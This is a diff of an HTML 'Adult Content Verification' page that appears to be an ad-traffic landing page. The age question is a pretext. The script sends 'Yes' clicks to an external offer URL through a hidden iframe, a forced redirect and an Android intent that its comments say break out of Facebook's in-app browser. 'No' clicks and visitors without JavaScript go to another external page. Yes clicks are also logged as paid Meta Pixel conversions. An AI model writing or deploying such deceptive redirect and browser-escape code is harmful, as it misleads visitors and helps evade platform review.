@@ -5,11 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="robots" content="noindex, nofollow">
     <title>Adult Content Verification</title>
-    
-    <!-- Open links in external browser meta tags -->
-    <meta property="al:web:should_fallback" content="false">
-    <meta name="apple-itunes-app" content="app-id=APP_ID, app-argument=YOUR_URL">
-    
     <style>
         body {
             margin: 0;
@@ -111,24 +106,28 @@
         }
     </style>
 
-    <!-- Meta Pixel Code - Placed right before closing head tag as requested -->
+    <!-- Meta Pixel Code -->
     <script>
-    !function(f,b,e,v,n,t,s)
-    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-    n.queue=[];t=b.createElement(e);t.async=!0;
-    t.src=v;s=b.getElementsByTagName(e)[0];
-    s.parentNode.insertBefore(t,s)}(window, document,'script',
-    'https://connect.facebook.net/en_US/fbevents.js');
-    fbq('init', '730466289457702');
-    fbq('track', 'PageView');
+        !function(f,b,e,v,n,t,s)
+        {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+        n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+        if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+        n.queue=[];t=b.createElement(e);t.async=!0;
+        t.src=v;s=b.getElementsByTagName(e)[0];
+        s.parentNode.insertBefore(t,s)}(window, document,'script',
+        'https://connect.facebook.net/en_US/fbevents.js');
+        fbq('init', '730466289457702');
+        fbq('track', 'PageView');
     </script>
-    <noscript><img height="1" width="1" style="display:none"
-    src="https://www.facebook.com/tr?id=730466289457702&ev=PageView&noscript=1"
-    /></noscript>
+    <noscript>
+        <img height="1" width="1" style="display:none"
+        src="https://www.facebook.com/tr?id=730466289457702&ev=PageView&noscript=1" />
+        <!-- Redirect for users without JS -->
+        <meta http-equiv="refresh" content="0; url=https://juicy-pleasure.github.io/Meet-me/">
+    </noscript>
     <!-- End Meta Pixel Code -->
 </head>
+
 <body>
     <div class="bg-pattern"></div>
     <div class="pulse"></div>
@@ -140,35 +139,40 @@
             <br>By entering, you confirm you are of legal age.
         </p>
         <div class="options">
-            <div class="option-btn no-btn" onclick="redirectToOffer()">No</div>
-            <div class="option-btn yes-btn" onclick="redirectToOffer()">Yes</div>
+            <div class="option-btn no-btn" onclick="redirectToOffer(event)">No</div>
+            <div class="option-btn yes-btn" onclick="redirectToOffer(event)">Yes</div>
         </div>
     </div>
 
     <script>
-        function redirectToOffer() {
+        function redirectToOffer(event) {
             // Track only "YES" button clicks as conversions
             if (event.target.classList.contains('yes-btn')) {
                 fbq('track', 'Lead', {
                     value: 10.00,
                     currency: 'USD'
                 });
+
+                // Multiple methods to open in external browser
+                setTimeout(function() {
+                    // Method 1: Iframe technique
+                    const iframe = document.createElement('iframe');
+                    iframe.style.display = 'none';
+                    iframe.src = 'https://ceremonyjogglecling.com/gdbhk20ju?key=df265084d01d7b7247e90c237c440f61';
+                    document.body.appendChild(iframe);
+                    
+                    // Method 2: Standard redirect
+                    window.location.href = 'https://ceremonyjogglecling.com/gdbhk20ju?key=df265084d01d7b7247e90c237c440f61';
+                    
+                    // Method 3: Android intent fallback
+                    window.open('intent://ceremonyjogglecling.com/gdbhk20ju?key=df265084d01d7b7247e90c237c440f61#Intent;scheme=https;package=com.android.chrome;end', '_blank');
+                }, 500);
+            } else if (event.target.classList.contains('no-btn')) {
+                setTimeout(function() {
+                    window.location.href = "https://juicy-pleasure.github.io/Meet-me/";
+                }, 500);
             }
-            
-            setTimeout(function() {
-                // Create a hidden iframe to break out of Facebook's in-app browser
-                const iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                iframe.src = 'https://ceremonyjogglecling.com/gdbhk20ju?key=df265084d01d7b7247e90c237c440f61&force_external_browser=true';
-                document.body.appendChild(iframe);
-                
-                // Fallback method - works on some devices
-                window.open('https://ceremonyjogglecling.com/gdbhk20ju?key=df265084d01d7b7247e90c237c440f61', '_system');
-                
-                // Additional fallback
-                window.location.href = 'intent://ceremonyjogglecling.com/gdbhk20ju?key=df265084d01d7b7247e90c237c440f61#Intent;scheme=https;package=com.android.chrome;end';
-            }, 1500);
         }
     </script>
 </body>
-  </html>
+</html>
